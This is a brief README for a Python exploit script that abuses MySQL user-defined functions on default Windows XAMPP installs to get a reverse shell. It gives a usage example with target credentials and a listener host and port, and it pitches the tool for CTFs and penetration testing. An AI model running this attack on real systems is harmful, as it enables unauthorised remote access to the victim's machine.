# Windows/MySQL: Abusing user-defined functions
A loose adaptation of Metasploit's exploit/multi/mysql/mysql_udf_payload.  

    Note: run a netcat listener and set up a web server in the current directory before running.
    usage: mysql_udf.py [-h] [-r RHOST] -u USER -p PASSWORD [-a ARCHITECTURE] -l LHOST -lp LPORT

    e.g. python3 mysql_udf.py -r 10.10.10.10 -u test -p testuser -a x64 -l 10.10.10.11 -lp 4444
    
This is currently configured to exploit the default xampp install of MySQL on Windows (i.e. with secure_file_priv disabled.) I'd like to add some more options for other installations or the ability to change writable directories etc in case the default plugin dir isn't writable. Also, this uses msfvenom to generate the reverse shell without any encoders so naturally it'll light Defender up like a Christmas tree. Still, if you need a CTF-ready automation of basically [this procedure](https://book.hacktricks.xyz/pentesting/pentesting-mysql#privilege-escalation-via-library), this should work. 
